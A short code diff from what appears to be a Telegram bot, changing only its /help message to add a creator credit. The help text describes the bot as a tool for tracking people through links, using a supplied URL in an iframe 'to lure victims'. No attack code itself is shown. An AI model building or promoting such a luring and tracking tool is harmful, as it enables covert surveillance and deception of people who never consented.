@@ -77,7 +77,7 @@ else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
+bot.sendMessage(chatId,`This bot is created by @sahil_official_here Through this bot you can track people just by sending a simple link.\n\nSend /create
 to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
 the url it will send you 2 links which you can use to track people.
 \n\nSpecifications.
